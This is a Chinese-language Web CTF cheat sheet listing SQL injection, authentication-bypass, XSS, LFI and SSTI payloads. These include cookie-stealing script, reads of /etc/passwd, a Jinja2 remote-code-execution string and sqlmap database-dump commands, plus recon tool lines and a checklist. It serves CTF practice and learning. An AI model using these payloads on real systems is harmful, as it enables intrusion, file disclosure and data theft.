# 🌐 Web CTF 速查表

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Web-CTF.tr.md) • [🇬🇷 Ελληνικά](Web-CTF.el.md)

> **译注：** JWT 的常见 JWS 紧凑形式由三个 Base64url 段组成，不能把完整令牌直接交给普通 Base64 解码器；`"eyJ..."` 也是占位文本。格式参见 [RFC 7515](https://www.rfc-editor.org/rfc/rfc7515.html)。解码不等同于验证签名。SQL 注释、LFI 的 `%00` 及 Jinja2 对象链示例都依赖具体应用和运行环境，不能视为通用有效的 payload。

---

## 💉 SQL 注入

### 基础 payload
```sql
' OR 1=1--
' OR '1'='1
" OR ""="
admin'--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
```

### SQLMap
```bash
sqlmap -u "http://url?id=1" --dbs
sqlmap -u "http://url?id=1" -D dbname --tables
sqlmap -u "http://url?id=1" -D dbname -T users --dump
```

---

## 📜 XSS（跨站脚本）

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(document.cookie)</script>
javascript:alert(1)
```

---

## 📁 LFI（本地文件包含）

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

---

## 🔧 SSTI（服务端模板注入）

### 检测
```
{{7*7}}     → 49 (Jinja2/Twig)
${7*7}      → 49 (Freemarker)
<%= 7*7 %>  → 49 (ERB)
```

### Jinja2 远程代码执行（RCE）
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

---

## 🔐 身份验证绕过

```
admin' --
admin'/*
' OR 1=1 LIMIT 1--
Password: ' OR '1'='1
```

---

## 🍪 Cookie/JWT

```bash
# JWT 解码
echo "eyJ..." | base64 -d

# 工具
jwt_tool.py token
jwt.io (online)
```

---

## 🛠️ 实用工具

```bash
# 目录穷举
gobuster dir -u http://url -w wordlist.txt

# 模糊测试（Fuzzing）
ffuf -u http://url/FUZZ -w wordlist.txt

# 参数发现
arjun -u http://url
```

---

## 📋 Web CTF 检查清单

```markdown
□ 查看页面源代码（Ctrl+U）
□ 检查 robots.txt、sitemap.xml
□ 检查 Cookie／JWT
□ 测试输入点的 SQL 注入
□ 测试输入点的 XSS
□ 测试文件参数的 LFI
□ 检查 SSTI
□ 目录穷举
□ 检查暴露的 .git
```

---

**返回 CTF:** [🏁 CTF 概览](./README.zh-CN.md)
